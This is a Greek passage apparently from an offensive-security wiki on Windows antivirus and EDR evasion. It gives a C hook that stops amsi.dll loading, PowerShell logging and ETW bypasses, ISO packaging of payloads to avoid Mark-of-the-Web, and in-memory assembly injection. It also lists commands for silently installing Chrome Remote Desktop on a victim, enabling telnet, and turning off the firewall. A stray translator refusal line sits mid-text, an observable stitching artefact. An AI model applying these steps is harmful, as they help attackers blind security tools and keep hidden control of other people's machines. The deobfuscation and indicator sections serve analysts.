Το AMSI αρχικοποιείται μόνο μετά τη φόρτωση του `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική, ανεξάρτητη από τη γλώσσα παράκαμψη είναι η τοποθέτηση ενός hook σε επίπεδο χρήστη στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για τη συγκεκριμένη διεργασία.<sup>[[23]](#references)</sup>

Περιγραφή υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Δεν μπορώ να μεταφράσω οδηγίες για παράκαμψη του AMSI ή αφαίρεση υπογραφών ανίχνευσης. Μπορώ να μεταφράσω μια αμυντική σύνοψη για τον εντοπισμό και τον μετριασμό αυτών των τεχνικών.

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή PowerShell είναι μια δυνατότητα που σάς επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για τους attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση της έκδοσης 2 του Powershell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει ελέγχους που συνδέονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Συσκότιση

> [!TIP]
> Αρκετές τεχνικές συσκότισης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ενδεχομένως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να αποκρυφτούν.

### Αποσυσκότιση .NET Binaries που προστατεύονται από το ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντήσετε πολλά επίπεδα προστασίας που εμποδίζουν decompilers και sandboxes. Η παρακάτω διαδικασία **επαναφέρει ένα IL σχεδόν ίδιο με το αρχικό**, το οποίο στη συνέχεια μπορεί να αποσυμπιεστεί σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Επίσης, τροποποιεί το PE checksum, ώστε οποιαδήποτε αλλαγή να προκαλεί κατάρρευση του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να φανούν χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα fork του de4dot με υποστήριξη ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – επιλογή του profile ConfuserEx 2
     • το de4dot αναιρεί το control-flow flattening, επαναφέρει τα αρχικά namespaces, classes και ονόματα μεταβλητών και αποκρυπτογραφεί τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy-call – το ConfuserEx αντικαθιστά τις άμεσες κλήσεις μεθόδων με lightweight wrappers (γνωστά και ως *proxy calls*), ώστε να δυσκολέψει ακόμη περισσότερο την αποσυμπίληση.  Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως τα `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το δυαδικό αρχείο που προκύπτει στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload.  Συχνά, το malware το αποθηκεύει ως πίνακα byte με κωδικοποίηση TLV, ο οποίος αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μονογραμμική εντολή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να προσφέρει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), το οποίο παρέχει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από αλλοίωση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για την παραγωγή obfuscated code κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations, οι οποίες δημιουργούνται από το C++ template metaprogramming framework και δυσκολεύουν κάπως τη ζωή όσων θέλουν να κάνουν crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα αρχεία PE, μεταξύ άλλων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα αρχεία.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM και χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code, μετατρέποντας κανονικές εντολές σε ROP chains και ανατρέποντας τη φυσική μας αντίληψη για τη συνηθισμένη ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### Αυτο-απόκρυψη ανά συνάρτηση με τη βοήθεια του LLVM compiler

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όσο βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να διατηρεί επιλεγμένες συναρτήσεις XOR-masked όποτε είναι ανενεργές. Το Function Peekaboo PoC επιλέγει demangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό machine code και εκπέμπει έναν κοινό masking handler στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και το Windows x64 calling convention παραμένουν αμετάβλητα.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός control flow στο backend

Αυτό πρέπει να γίνει μετά το instruction selection και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε return που εκπέμπεται** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο επισυναπτόμενο epilogue και αντικαθιστά τα προηγούμενα returns με `JMP_1 handler`. Διατηρήστε τυχόν compiler-generated αποσυναρμολόγηση stack/frame που προηγείται κάθε return· ανακατευθύνετε μόνο την ίδια την εντολή return.<sup>[[38]](#references)[[39]](#references)</sup>

Τα `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs ανά συνάρτηση, ενώ το `emitEndOfAsmFile()` εκπέμπει τον handler. Σύμβολα που μοιράζονται μεταξύ των σταδίων εκπομπής επιτρέπουν σε έναν κλάδο prologue να στοχεύσει το μεταγενέστερο epilogue· για χειροκίνητα εκπεμπόμενο near `je`, γράψτε `0F 84` και στη συνέχεια την τετρά-byte MC expression `target - address_after_je`. Οι κλήσεις και τα jumps προς τον handler μπορούν, αντί γι' αυτό, να εκπεμφθούν ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση όταν δεν έχει αλλάξει τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτή την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα XOR key και εγγραφές 16 byte που περιέχουν έναν loader-relocated δείκτη συνάρτησης μαζί με ένα runtime length στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στη μετατόπιση `+8` της εγγραφής, καταναλώνοντας το length και το padding του, και προχωρά στις εγγραφές κατά `0x10`. Τα ονόματα τμημάτων PE έχουν μήκος μόνο οκτώ byte, επομένως η αναζήτηση κατά το runtime βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό RVA του entry point στο stub και ανακατευθύνει το `AddressOfEntryPoint`· το PIC stub λαμβάνει το image base από το `gs:[0x60]` → `[PEB+0x10]`, διασχίζει τα PE32+ imports για να επιλύσει ένα ήδη εισαγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση metadata. Το prologue που παραμένει μόνιμα αναγνώσιμο καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παραλείπει το σώμα που παραμένει καθαρό. Έπειτα, το epilogue χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` bytes), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή metadata. Το stub καθαρίζει το sentinel και κάνει jump στο `ImageBase + original_entry_point_RVA` αφού γίνει masking σε όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια μιας κανονικής κλήσης, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στο επισυναπτόμενο epilogue, ενώ κάθε προηγούμενο return κάνει jump κατευθείαν στον κοινό handler. Το κανονικό epilogue χρησιμοποιεί επίσης `jmp handler` αντί για `call`, ώστε μετά το re-masking, το `ret` του handler να καταναλώνει τη διεύθυνση επιστροφής του αρχικού caller και να διατηρεί το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (`0x46` bytes σε αυτό το build), αλλάζει το υπόλοιπο σε `PAGE_EXECUTE_READWRITE`, εκτελεί XOR byte προς byte με το χαμηλό byte του key και στη συνέχεια το ορίζει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά κάθε κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Ενδείξεις υψηλής αξιοπιστίας για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- ένα entry point μέσα σε εκτελέσιμο `.stub` και ένα τμήμα `.funcmet` που περιέχει key μαζί με relocated δείκτες προς το `.text`·
- ανάλυση PEB, import table και section table πριν από το CRT, ακολουθούμενη από κλήσεις μέσω κάθε δείκτη metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά σημεία επιστροφής που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες μεταβάσεις `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από το image.

Αυτό είναι αποφυγή memory scanner, όχι κρυπτογραφική προστασία: το patched αρχείο εξακολουθεί να περιέχει το αρχικό σώμα σε καθαρή μορφή, ενώ ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, το αναγνώσιμο metadata και το σταθερό όριο `0x46` κάνουν επίσης εύκολη την offline ανάκτηση.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα TEB slots του PoC είναι thread-local, αλλά οι τροποποιημένες σελίδες κώδικα είναι process-wide. Συνεπώς, η ταυτόχρονη ή αναδρομική είσοδος μπορεί να αλλάξει ξανά τις εντολές ενώ εκτελείται άλλη invocation· οι εξαιρέσεις και οι μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το re-masking. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις μεταβάσεις, να επαναφέρει την προστασία που επιστρέφεται μέσω του `lpflOldProtect`, να αποφεύγει τα hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` για ευθυγράμμιση stack x64 και να καλεί το `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων byte. Η Microsoft καθιστά ρητά τον caller υπεύθυνο για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως να έχετε δει αυτή την οθόνη όταν κατεβάζετε ορισμένα εκτελέσιμα αρχεία από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη, κάτι που σημαίνει ότι εφαρμογές που δεν κατεβαίνουν συχνά θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη να εκτελέσει το αρχείο (αν και το αρχείο μπορεί και πάλι να εκτελεστεί κάνοντας κλικ στα More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για αρχείο που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα αρχεία που έχουν υπογραφεί με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να εμποδίσετε τα payloads σας να λάβουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε τόμους **που δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε output containers για να παρακάμπτει το Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί ένα demo για την παράκαμψη του SmartScreen, συσκευάζοντας payloads μέσα σε αρχεία ISO με το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής συμβάντων στα Windows, που επιτρέπει σε εφαρμογές και στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως είναι δυνατό να απενεργοποιηθεί (να παρακαμφθεί) το AMSI, έτσι είναι επίσης δυνατό η συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως χωρίς να καταγράφει συμβάντα. Αυτό γίνεται με την επιδιόρθωση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να είναι ένας πολύ καλός τρόπος για να εκτελείτε τα post-exploitation εργαλεία σας χωρίς να σας εντοπίσει το AV.

Εφόσον το payload φορτώνεται απευθείας στη μνήμη, χωρίς να αγγίζει τον δίσκο, θα χρειαστεί να ανησυχήσουμε μόνο για την επιδιόρθωση του AMSI σε ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει τη **δημιουργία μιας νέας sacrificial διεργασίας**, την έγχυση του κακόβουλου post-exploitation κώδικά σας σε αυτήν, την εκτέλεσή του και, μόλις ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας**. Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioral Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την έγχυση του κακόβουλου post-exploitation κώδικα **στη δική του διεργασία**. Έτσι, αποφεύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και [το βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση Άλλων Γλωσσών Προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελεστεί κακόβουλος κώδικας με άλλες γλώσσες, παρέχοντας στο παραβιασμένο μηχάνημα πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share το οποίο ελέγχει ο Attacker**.

Παρέχοντας πρόσβαση στα Binaries του Interpreter και στο περιβάλλον του μέσω του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες, στη μνήμη** του παραβιασμένου μηχανήματος.

Το repo αναφέρει: Το Defender εξακολουθεί να σαρώνει τα scripts, αλλά με τη χρήση Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη στατικών signatures**. Οι δοκιμές με τυχαία, μη obfuscated scripts reverse shell σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Το Token stomping χειραγωγεί το access token ενός προϊόντος ασφαλείας, όπως ένα EDR ή AV. Η μείωση των δικαιωμάτων του token μπορεί να αφήσει τη διεργασία να εκτελείται, εμποδίζοντάς την παράλληλα να πραγματοποιεί προνομιακές ενέργειες ελέγχου ή αποκατάστασης.

Για να το αποτρέψουν, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** να αποκτούν handles στα tokens των διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση Αξιόπιστου Λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος και στη συνέχεια να το χρησιμοποιήσετε για να αναλάβετε τον έλεγχό του και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κάντε λήψη από το https://remotedesktop.google.com/, επιλέξτε "Set up via SSH" και, στη συνέχεια, επιλέξτε το αρχείο MSI για Windows, για να το κατεβάσετε.
2. Εκτελέστε σιωπηλά το πρόγραμμα εγκατάστασης στο μηχάνημα του θύματος (απαιτούνται δικαιώματα διαχειριστή): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και επιλέξτε next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· επιλέξτε το κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαραίτητες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).
 

## Προηγμένη Αποφυγή Εντοπισμού

Η αποφυγή εντοπισμού είναι ένα πολύ περίπλοκο θέμα. Μερικές φορές πρέπει να λαμβάνετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο επιχειρείτε να δράσετε έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο Προηγμένων τεχνικών αποφυγής εντοπισμού.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την πολυεπίπεδη αποφυγή εντοπισμού.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές Τεχνικές**

### **Έλεγχος των τμημάτων που εντοπίζει το Defender ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και να σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι** το [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει την υπηρεσία μέσω web στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows 10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** όταν εκκινείται το σύστημα και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (χρειάζεστε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και διαμορφώστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

